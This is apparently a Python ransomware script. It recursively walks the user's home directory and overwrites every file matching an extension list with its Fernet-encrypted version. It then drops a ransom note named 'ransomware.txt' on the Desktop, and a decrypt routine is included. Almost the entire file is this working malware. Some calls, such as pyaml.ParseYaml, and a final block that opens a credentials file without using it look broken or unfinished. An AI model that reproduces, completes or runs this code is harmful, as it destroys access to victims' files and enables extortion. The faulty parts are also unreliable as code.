import os
import re
import mmap
import shutil
from pathlib import Path
import pyaml
from cryptography.fernet import Fernet


def Process_Files(Private: Fernet, mode: str) -> None:
    for _, files in List_Files().items():
        for file in files:
            temp_file = file + '.temp'
            try:
                with open(file, 'rb') as original_file, open(temp_file, 'wb', buffering=4096*1024) as temp_file:
                    with mmap.mmap(original_file.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                        offset = 0
                        while offset < len(mm):
                            chunk = mm[offset:offset + 4096 * 1024]
                            if not chunk:
                                break
                            processed_chunk = Private.encrypt(chunk) if mode == 'encrypt' else Private.decrypt(chunk)
                            temp_file.write(processed_chunk)
                            offset += len(chunk)
                shutil.move(temp_file.name, file)
            except Exception:
                if os.path.exists(temp_file.name):
                    os.remove(temp_file.name)


def Encrypt(Private: Fernet) -> None:
    Process_Files(Private, 'encrypt')


def Decrypt(Private: Fernet) -> None:
    Process_Files(Private, 'decrypt')


def Contact() -> None:
    home = Path.home()
    desktop = home / "Desktop" / 'ransomware.txt'
    with open('scripts/info.txt', 'r') as file:
        info = file.read()
    if desktop.exists():
        desktop.unlink()

    try:
        with open(desktop, 'w') as file:
            file.write(info) 
    except:
        try:
            with open(home / 'ransomware.txt', 'w') as file:
                file.write(info)
        except:
            try:
                with open('ransomware.txt', 'w') as file:
                    file.write(info)
            except:
                pass


def List_Files() -> dict:
    
    with open('scripts/extensions.yaml', 'r') as file:
        exts = pyaml.ParseYaml(file)

    file_categories = {category: [] for category in exts}
    extcategory = {ext: category for category, ext_list in exts.items() for ext in ext_list}

    for entry in Path.home().rglob('*'):
        if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
            file_categories[extcategory[ext]].append(str(entry))

    return file_categories


with open('scripts/credentials.yaml', 'r') as file:
    pass